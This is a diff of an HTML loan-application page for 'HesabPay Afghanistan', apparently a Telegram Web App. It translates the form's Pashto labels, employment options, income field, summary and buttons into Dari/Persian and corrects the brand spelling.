@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ps" dir="rtl">
+<html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>د پور غوښتنه - پایله</title>
+    <title>درخواست قرضه‌ - نتیجه</title>
 
     <!-- ✅ FIXED Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -178,14 +178,14 @@
 <body>
 
 <div class="nav-header">
-    <div onclick="goBack()" style="cursor:pointer; font-size:16px;">← بیرته تګ</div>
-    <div class="waafi-logo">Hesapay</div>
+    <div onclick="goBack()" style="cursor:pointer; font-size:16px;">← برگشت</div>
+    <div class="waafi-logo">HesabPay</div>
     <div style="font-size: 22px;">☰</div>
 </div>
 
 <div class="form-card">
-    <h2>د پور غوښتنه</h2>
-    <p class="step-info">دریم پړاو د 3 څخه</p>
+    <h2>درخواست قرضه‌</h2>
+    <p class="step-info">مرحله ۳ از ۳</p>
 
     <div class="progress-box">
         <div class="bar"></div>
@@ -194,52 +194,52 @@
     </div>
 
     <div class="input-wrap">
-        <label>د دندې حالت</label>
+        <label>وضعیت شغلی</label>
         <select id="jobStatus">
-            <option value="مندمند / کارمند">مندمند / کارمند</option>
-            <option value="سوداګر">سوداګر</option>
-            <option value="محصل / زده کونکی">محصل / زده کونکی</option>
-            <option value="بې کاره">بې کاره</option>
-            <option value="تقاعد شوی">تقاعد شوی</option>
+            <option value="مندمند / کارمند">کارمند</option>
+            <option value="سوداګر">تاجر / سوداگر</option>
+            <option value="محصل / زده کونکی">محصل / دانش‌آموز</option>
+            <option value="بې کاره">بی‌کار</option>
+            <option value="تقاعد شوی">متقاعد</option>
         </select>
     </div>
 
     <div class="input-wrap">
-        <label>کلنی عاید (AFN)</label>
-        <input type="text" id="income" placeholder="مثال: 250000">
+        <label>عاید سالانه (AFN)</label>
+        <input type="text" id="income" placeholder="مثال: ۲۵۰۰۰۰">
     </div>
 
     <div class="summary-box">
-        <h3>د غوښتنې لنډیز</h3>
+        <h3>خلاصه درخواست</h3>
 
         <div class="summary-item">
-            <span class="summary-label">د پور مقدار:</span>
+            <span class="summary-label">مقدار قرضه‌:</span>
             <span class="summary-value" id="sumAmount">--</span>
         </div>
 
         <div class="summary-item">
-            <span class="summary-label">د پور موده:</span>
+            <span class="summary-label">مدت قرضه‌:</span>
             <span class="summary-value" id="sumDuration">--</span>
         </div>
 
         <div class="summary-item">
-            <span class="summary-label">موخه:</span>
+            <span class="summary-label">هدف:</span>
             <span class="summary-value" id="sumPurpose">--</span>
         </div>
 
         <div class="summary-item">
-            <span class="summary-label">غوښتونکی:</span>
+            <span class="summary-label">درخواست‌کننده:</span>
             <span class="summary-value" id="sumName">--</span>
         </div>
     </div>
 
     <div class="btn-container">
-        <button type="button" class="submit-btn" onclick="submitForm()">غوښتنه ولیږئ</button>
-        <button type="button" class="back-btn" onclick="goBack()">شا ته</button>
+        <button type="button" class="submit-btn" onclick="submitForm()">ارسال درخواست</button>
+        <button type="button" class="back-btn" onclick="goBack()">قبلی</button>
     </div>
 </div>
 
-<div class="footer-text">© 2026 Hesapay Afghanistan. ټولې حقونه خوندي دي.</div>
+<div class="footer-text">© 2026 HesabPay Afghanistan. تمامی حقوق محفوظ است.</div>
 
 <script>
 window.onload = () => {
